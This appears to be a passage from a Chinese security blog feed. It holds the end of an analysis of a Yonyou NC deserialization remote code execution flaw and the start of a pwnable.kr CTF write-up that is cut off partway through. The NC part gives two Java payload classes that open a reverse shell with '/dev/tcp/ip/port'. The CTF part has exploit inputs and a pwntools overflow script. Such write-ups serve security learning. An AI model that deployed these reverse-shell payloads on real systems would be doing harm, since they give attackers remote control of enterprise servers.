punctuation">}</span></code></pre><p>ËøúÁ®ãÁºñËØëÈÉ®ÁΩ≤</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Context<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Name<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>spi<span class="token punctuation">.</span>ObjectFactory<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Hashtable<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">remote</span> <span class="token keyword">implements</span> <span class="token class-name">ObjectFactory</span><span class="token punctuation">,</span> Serializable <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">remote</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>            java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"sh -i >&amp; /dev/tcp/ip/port 0>&amp;1"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">getObjectInstance</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">,</span> Name name<span class="token punctuation">,</span> Context nameCtx<span class="token punctuation">,</span> Hashtable<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token operator">></span> environment<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>ÂΩìÁÑ∂‰πüÂèØ‰ª•ÈÄâÊã©Âà©Áî® nc Ëá™Â∏¶ÁöÑÁ±ªËøõË°åËøúÁ®ãÈÉ®ÁΩ≤Âà©Áî®</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> nc<span class="token punctuation">.</span>bs<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>common<span class="token punctuation">.</span>ComponentMetaVO<span class="token punctuation">;</span><span class="token keyword">import</span> nc<span class="token punctuation">.</span>bs<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteAddressSelector<span class="token punctuation">;</span><span class="token keyword">import</span> nc<span class="token punctuation">.</span>bs<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteProxy<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">remote</span> <span class="token keyword">implements</span> <span class="token class-name">RemoteProxy</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">remote</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>            java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"sh -i >&amp; /dev/tcp/ip/port 0>&amp;1"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">getAttribute</span><span class="token punctuation">(</span>String s<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAttribute</span><span class="token punctuation">(</span>String s<span class="token punctuation">,</span> Object o<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> ComponentMetaVO <span class="token function">getComponentMetaVO</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getRetryMax</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setRetryMax</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">long</span> <span class="token function">getRetryInterval</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setRetryInterval</span><span class="token punctuation">(</span><span class="token keyword">long</span> l<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setRemoteAddressSelector</span><span class="token punctuation">(</span>RemoteAddressSelector remoteAddressSelector<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> RemoteAddressSelector <span class="token function">getRemoteAddressSelector</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="ÊïàÊûú"><a href="#ÊïàÊûú" class="headerlink" title="ÊïàÊûú"></a>ÊïàÊûú</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/608d18f0/mov.gif" alt="mov"></p><h2 id="ÂèÇËÄÉËµÑÊñô"><a href="#ÂèÇËÄÉËµÑÊñô" class="headerlink" title="ÂèÇËÄÉËµÑÊñô"></a>ÂèÇËÄÉËµÑÊñô</h2><ol><li><a href="https://nosec.org/home/detail/4472.html" target="_blank" rel="noopener">„ÄêÂÆâÂÖ®ÈÄöÊä•„ÄëÁî®ÂèãNCÂèçÂ∫èÂàóÂåñËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Ê¨†‰∫ÜÂæà‰πÖÔºåÁÆÄÂçïÂàÜÊûê‰∏ã~&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Pwnable.kr ‰πã Toddler&#39;s Bottle</title>
    <link href="https://blog.sari3l.com/posts/d4fb29f2/"/>
    <id>https://blog.sari3l.com/posts/d4fb29f2/</id>
    <published>2020-06-14T14:54:02.000Z</published>
    <updated>2020-07-06T09:45:14.050Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ÂáÜÂ§á"><a href="#ÂáÜÂ§á" class="headerlink" title="ÂáÜÂ§á"></a>ÂáÜÂ§á</h2><ol><li><p>ÂÖ≥‰∫éÂèçÊ±áÁºñÊó∂ÂáΩÊï∞ÊòæÁ§∫ plt </p><ul><li>ÂéüÂõ†Ôºö<a href="https://www.binss.me/blog/plt-and-got/" target="_blank" rel="noopener">PLT‰∏éGOT</a></li><li>Ëß£ÂÜ≥ÊñπÊ°àÔºö<a href="https://reverseengineering.stackexchange.com/questions/19895/radares-aaaa-and-aa-what-does-it-do-exactly" target="_blank" rel="noopener">Radare‚Äôs <code>aaaa</code> and -AA what does it do, exactly?</a></li></ul></li><li><p>Ê≥®ÊÑè pwndbg ÂØπ heap ÂëΩ‰ª§ËøõË°åËøá‰∏ÄÊ¨°Â§ßÊîπÔºåÊúÄÂêé‰∏ÄÊ¨°ËøòÊòì‰ΩøÁî® commit ‰∏∫ fbd2bb3abfc2500aae76d159e23015008e879b8d<br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15915160149123.jpg" alt="-w878"></p></li></ol><h2 id="1-fd"><a href="#1-fd" class="headerlink" title="1. [fd]"></a>1. [fd]</h2><h3 id="È¢òÁõÆ"><a href="#È¢òÁõÆ" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c">fd@pwnable<span class="token punctuation">:</span><span class="token operator">~</span>$ cat fd<span class="token punctuation">.</span>c<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pass argv[1] a number\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1234</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    len <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"LETMEWIN\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"good job :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"learn about Linux file IO\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê"><a href="#ÂàÜÊûê" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>Êàë‰ª¨È¶ñÂÖàÊ≥®ÊÑèÂà∞ read ÂáΩÊï∞ËØ≠Ê≥ïÔºåÊöÇÊó∂Ê≤°ÊâæÂà∞</p><p>Áî±‰∫é fd ‰∏∫‰º†ÂÖ•ÂèØÊéßÔºåÂΩìÊàë‰ª¨Â∞Ü fd=0x0Êó∂ÔºåÂç≥ fd=stdin Êó∂ÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•ÊéßÂà∂ buf ÂÜÖÁöÑÂÜÖÂÆπÔºå‰ªéËÄåÈÄöËøáÂà§Êñ≠Ëé∑Âèñ flag</p><h3 id="Ëß£È¢ò"><a href="#Ëß£È¢ò" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-shell"><code class="language-shell">fd@pwnable:~$ ./fd 4660LETMEWINgood job :)mommy! I think I know what a file descriptor is!!</code></pre><h2 id="2-collision"><a href="#2-collision" class="headerlink" title="2. collision"></a>2. collision</h2><h3 id="È¢òÁõÆ-1"><a href="#È¢òÁõÆ-1" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> hashcode <span class="token operator">=</span> <span class="token number">0x21DD09EC</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token function">check_password</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span><span class="token operator">*</span> ip <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        res <span class="token operator">+</span><span class="token operator">=</span> ip<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"usage : %s [passcode]\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"passcode length should be 20 bytes\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>hashcode <span class="token operator">==</span> <span class="token function">check_password</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wrong passcode.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-1"><a href="#ÂàÜÊûê-1" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><ol><li>ÈôêÂà∂‰º†ÂÖ•ÂÄº‰∏∫ 20 Â≠óËäÇ</li><li>Â∞Ü‰º†ÂÖ•ÁöÑÂÜÖÂÆπÂàÜ‰∏∫ 5 ‰∏™ int ÂÄº</li><li>sum ‰πãÂíåÈúÄ‰∏∫ hashcode</li></ol><p>0x21DD09EC == 568134124 == 113626824*4 + 113626828</p><h3 id="Ëß£È¢ò-1"><a href="#Ëß£È¢ò-1" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-shell"><code class="language-shell">col@pwnable:~$ ./col `echo -e "\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06"`daddy! I just managed to create a hash collision :)</code></pre><p>ÊàñËÄÖ</p><pre class=" language-shell"><code class="language-shell">col@pwnable:~$ ./col `printf "\xc8\xce\xc5\x06%0.s" {1..4} && printf "\xcc\xce\xc5\x06"`daddy! I just managed to create a hash collision :)</code></pre><p><a href="https://qastack.cn/superuser/86340/linux-command-to-repeat-a-string-n-times" target="_blank" rel="noopener">https://qastack.cn/superuser/86340/linux-command-to-repeat-a-string-n-times</a></p><h2 id="3-bof"><a href="#3-bof" class="headerlink" title="3. bof"></a>3. bof</h2><h3 id="È¢òÁõÆ-2"><a href="#È¢òÁõÆ-2" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">int</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> overflowme<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"overflow me : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">gets</span><span class="token punctuation">(</span>overflowme<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// smash me!</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>key <span class="token operator">==</span> <span class="token number">0xcafebabe</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Nah..\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">func</span><span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-2"><a href="#ÂàÜÊûê-2" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>Âú® Ninja ‰∏≠ÔºåÂèØ‰ª•Êñπ‰æøÁúãÂà∞ÈÄªËæëÂà§Êñ≠</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15907181567512.jpg" alt="-w815"></p><p>Êàë‰ª¨Êù•Áúã‰∏ãCËØ≠Ë®ÄÂáΩÊï∞Ë∞ÉÁî®Ê†àÁöÑÂÖ∏ÂûãÂÜÖÂ≠òÂ∏ÉÂ±Ä</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15907189598255.jpg" alt></p><p>Âõ†‰∏∫Â≠òÂÇ®ÂèòÈáèÊó∂ÊòØ‰ªé‰ΩéÂú∞ÂùÄÂºÄÂßãË¶ÜÁõñÁöÑÔºåÊâÄ‰ª•‰ªé ebp-0x2c Âà∞ ebp+0x8ÔºåÊàë‰ª¨ÈúÄË¶ÅË¶ÜÁõñÈïøÂ∫¶ 0x34 ÁöÑÊï∞ÊçÆÔºåÁÑ∂ÂêéË¶ÜÁõñÂèòÈáèÂÄº‰∏∫0xcafebabe</p><h3 id="Ëß£È¢ò-2"><a href="#Ëß£È¢ò-2" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>conn <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> <span class="token number">9000</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b<span class="token string">"A"</span><span class="token operator">*</span><span class="token number">52</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xcafebabe</span><span class="token punctuation">)</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="4-flag"><a href="#4-flag" class="headerlink" title="4. flag"></a>4. flag</h2><h3 id="È¢òÁõÆ-3"><a href="#È¢òÁõÆ-3" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-plain"><code class="language-plain">Papa brought me a packed present! let's open it.Download : http://pwnable.kr/bin/flagThis is reversing task. all you need is binary</code></pre><h3 id="ÂàÜÊûê-3"><a href="#ÂàÜÊûê-3" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>È¶ñÂÖàÊãøÂà∞È¢òÁõÆÔºåÁõ¥Êé•ÊãñËøõ Ninja ÂèØ‰ª•ÂèëËßâÊòØÂä†‰∫ÜÂ£≥ÁöÑÔºåÁÆÄÂçïËØÜÂà´‰∏ãÂèØ‰ª•ÁúãÂà∞ÊòØ upx Â£≥</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15907233766982.jpg" alt="-w411"></p><p>Âà©Áî®<code>upx -d</code>ËÑ±Â£≥</p><pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/Ê°åÈù¢$ '/home/pwn/tools/upx-3.96-amd64_linux/upx' -d flag                        Ultimate Packer for eXecutables                          Copyright (C) 1996 - 2020UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020        File size         Ratio      Format      Name   --------------------   ------   -----------   -----------    883745 <-    335288   37.94%   linux/amd64   flagUnpacked 1 file.</code></pre><p>Êü•Áúã‰∏ã main ÂáΩÊï∞ÔºåÊ≥®ÊÑèÂà∞Â≠óÁ¨¶‰∏≤Â≠òÂÇ®ÁöÑ‰ΩçÁΩÆ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15907236039631.jpg" alt="-w452"></p><p>ÁÇπËøõÂéªÁúã‰∏ãÔºåÂèØ‰ª•ÁúãÂà∞‰∏äÈù¢ÁöÑÈÇ£‰∏≤Â∫îËØ•Â∞±ÊòØ flag ‰∫Ü</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15907235836712.jpg" alt="-w994"></p><h3 id="Ëß£È¢ò-3"><a href="#Ëß£È¢ò-3" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/Ê°åÈù¢$ strings flag | grep ':)'UPX...? sounds like a delivery service :)</code></pre><h2 id="5-passcode"><a href="#5-passcode" class="headerlink" title="5. passcode"></a>5. passcode</h2><h3 id="È¢òÁõÆ-4"><a href="#È¢òÁõÆ-4" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> passcode1<span class="token punctuation">;</span>    <span class="token keyword">int</span> passcode2<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"enter passcode1 : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> passcode1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"enter passcode2 : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> passcode2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"checking...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>passcode1<span class="token operator">==</span><span class="token number">338150</span> <span class="token operator">&amp;&amp;</span> passcode2<span class="token operator">==</span><span class="token number">13371337</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Login OK!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Login Failed!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">welcome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"enter you name : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%100s"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token 